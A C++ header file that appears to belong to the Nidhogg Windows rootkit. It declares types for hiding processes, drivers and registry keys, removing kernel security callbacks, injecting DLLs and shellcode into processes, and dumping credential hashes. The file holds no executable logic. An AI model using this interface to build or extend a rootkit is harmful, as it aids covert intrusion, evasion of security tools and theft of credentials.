#pragma once

constexpr ULONG MAX_PATCHED_MODULES = 256;
constexpr ULONG MAX_FILES = 256;
constexpr ULONG MAX_DRIVER_PATH = 256;
constexpr ULONG MAX_PIDS = 256;
constexpr ULONG MAX_TIDS = 256;
constexpr ULONG MAX_ROUTINES = 64;

constexpr ULONG REG_KEY_LEN = 255;
constexpr ULONG REG_VALUE_LEN = 260;

enum NidhoggErrorCodes {
	NIDHOGG_SUCCESS,
	NIDHOGG_GENERAL_ERROR,
	NIDHOGG_ERROR_CONNECT_DRIVER,
	NIDHOGG_ERROR_DEVICECONTROL_DRIVER,
	NIDHOGG_INVALID_COMMAND,
	NIDHOGG_INVALID_OPTION,
	NIDHOGG_INVALID_INPUT
};

enum class MODE {
	KernelMode,
	UserMode
};

enum SignatureType
{
	PsProtectedTypeNone = 0,
	PsProtectedTypeProtectedLight = 1,
	PsProtectedTypeProtected = 2
};

enum SignatureSigner
{
	PsProtectedSignerNone = 0,      // 0
	PsProtectedSignerAuthenticode,  // 1
	PsProtectedSignerCodeGen,       // 2
	PsProtectedSignerAntimalware,   // 3
	PsProtectedSignerLsa,           // 4
	PsProtectedSignerWindows,       // 5
	PsProtectedSignerWinTcb,        // 6
	PsProtectedSignerWinSystem,     // 7
	PsProtectedSignerApp,           // 8
	PsProtectedSignerMax            // 9
};

enum InjectionType {
	APCInjection,
	NtCreateThreadExInjection
};

enum RegItemType {
	RegProtectedKey = 0,
	RegProtectedValue = 1,
	RegHiddenKey = 2,
	RegHiddenValue = 3
};

enum CallbackType {
	ObProcessType,
	ObThreadType,
	PsCreateProcessTypeEx,
	PsCreateProcessType,
	PsCreateThreadType,
	PsCreateThreadTypeNonSystemThread,
	PsImageLoadType,
	CmRegistryType
};

// *********************************************************************************************************

// ** General Structures ***************************************************************************************
struct KernelCallback {
	CallbackType Type;
	ULONG64 CallbackAddress;
	bool Remove;
};

struct ObCallback {
	PVOID PreOperation;
	PVOID PostOperation;
	CHAR DriverName[MAX_DRIVER_PATH];
};

struct PsRoutine {
	ULONG64 CallbackAddress;
	CHAR DriverName[MAX_DRIVER_PATH];
};

struct CmCallback {
	ULONG64 CallbackAddress;
	ULONG64 Context;
	CHAR DriverName[MAX_DRIVER_PATH];
};

struct ObCallbacksList {
	CallbackType Type;
	ULONG NumberOfCallbacks;
	ObCallback* Callbacks;
};

struct PsRoutinesList {
	CallbackType Type;
	ULONG NumberOfRoutines;
	PsRoutine* Routines;
};

struct CmCallbacksList {
	ULONG NumberOfCallbacks;
	CmCallback* Callbacks;
};

struct PatchedModule {
	ULONG Pid;
	PVOID Patch;
	ULONG PatchLength;
	CHAR* FunctionName;
	WCHAR* ModuleName;
};

struct OutputProtectedProcessesList {
	ULONG PidsCount;
	ULONG Processes[MAX_PIDS];
};

struct OutputThreadsList {
	ULONG TidsCount;
	ULONG Threads[MAX_TIDS];
};

struct ProcessSignature {
	ULONG Pid;
	UCHAR SignerType;
	UCHAR SignatureSigner;
};

struct FileItem {
	int FileIndex;
	WCHAR FilePath[MAX_PATH];
};

struct RegItem {
	int RegItemsIndex;
	ULONG Type;
	WCHAR KeyPath[REG_KEY_LEN];
	WCHAR ValueName[REG_VALUE_LEN];
};

struct PkgReadWriteData {
	MODE Mode;
	ULONG Pid;
	SIZE_T Size;
	PVOID LocalAddress;
	PVOID RemoteAddress;
};

struct DllInformation {
	InjectionType Type;
	ULONG Pid;
	CHAR DllPath[MAX_PATH];
};

struct ShellcodeInformation {
	InjectionType Type;
	ULONG Pid;
	ULONG ShellcodeSize;
	PVOID Shellcode;
	PVOID Parameter1;
	PVOID Parameter2;
	PVOID Parameter3;
};

struct HiddenModuleInformation {
	ULONG Pid;
	WCHAR* ModuleName;
};

struct HiddenDriverInformation {
	WCHAR* DriverName;
	bool Hide;
};

struct ProtectedProcess {
	ULONG Pid;
	bool Protect;
};

struct HiddenProcess {
	ULONG Pid;
	bool Hide;
};

struct ProtectedThread {
	ULONG Tid;
	bool Protect;
};

struct ProtectedFile {
	WCHAR* FilePath;
	bool Protect;
};

struct RegistryQueryResult {
	std::vector<std::wstring> Values;
	std::vector<std::wstring> Keys;
};

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
#ifdef MIDL_PASS
	[size_is(MaximumLength / 2), length_is((Length) / 2)] USHORT* Buffer;
#else // MIDL_PASS
	_Field_size_bytes_part_opt_(MaximumLength, Length) PWCH   Buffer;
#endif // MIDL_PASS
} UNICODE_STRING, * PUNICODE_STRING;

struct DesKeyInformation {
	ULONG Size;
	PVOID Data;
};

struct Credentials {
	UNICODE_STRING Username;
	UNICODE_STRING Domain;
	UNICODE_STRING EncryptedHash;
};

struct OutputCredentials {
	ULONG Index;
	Credentials Creds;
};
